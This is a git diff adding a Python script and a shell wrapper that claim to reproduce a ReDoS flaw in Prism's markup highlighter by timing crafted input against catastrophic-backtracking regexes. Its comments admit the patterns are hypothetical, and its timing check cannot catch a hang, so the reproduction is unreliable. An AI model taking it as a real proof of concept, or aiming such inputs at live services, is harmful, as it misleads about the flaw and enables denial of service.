
diff --git a/ACI_unit_test.py b/ACI_unit_test.py
new file mode 100644
index 00000000..ef07fd88
--- /dev/null
+++ b/ACI_unit_test.py
@@ -0,0 +1,33 @@
+import re
+import time
+
+# Simulating the vulnerable regex patterns from prism-markup.min.js
+# These are hypothetical patterns based on the CVE description.
+vulnerable_regexes = [
+    re.compile(r'(\s+|\w+|\d+|\W+|\D+)*'),
+    re.compile(r'([a-zA-Z]+|\s+|\d+|\W+|\D+)*'),
+    re.compile(r'(\w+|\W+|\s+|\d+|\D+)*'),
+    re.compile(r'(\d+|\D+|\w+|\W+|\s+)*')
+]
+
+# Crafted input that causes excessive backtracking
+exploit_input = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!" * 1000
+
+# Function to test the regex for vulnerability
+def test_regex_performance(regex, test_input):
+    start_time = time.time()
+    try:
+        # If the regex operation takes too long, consider it a successful exploit
+        if regex.match(test_input):
+            duration = time.time() - start_time
+            if duration > 2:  # More than 2 seconds to process
+                return True
+    except re.error:
+        pass
+    return False
+
+# Main execution
+if any(test_regex_performance(regex, exploit_input) for regex in vulnerable_regexes):
+    print('The ACI exploit success!!!')
+else:
+    print('The ACI exploit failed!!!')
diff --git a/ACI_unit_test.sh b/ACI_unit_test.sh
new file mode 100755
index 00000000..73f95795
--- /dev/null
+++ b/ACI_unit_test.sh
@@ -0,0 +1,19 @@
+#!/bin/bash
+
+# Setting up the environment
+echo "Setting up the environment..."
+# Assuming Python3 is required as per the repository's README
+python3 -m venv venv
+source venv/bin/activate
+
+# Installing necessary Python packages
+echo "Installing necessary packages..."
+pip install regex
+
+# Running the exploit test script
+echo "Running the ACI_unit_test.py script..."
+python ACI_unit_test.py
+
+# Deactivating the virtual environment
+deactivate
+echo "Environment cleanup completed."
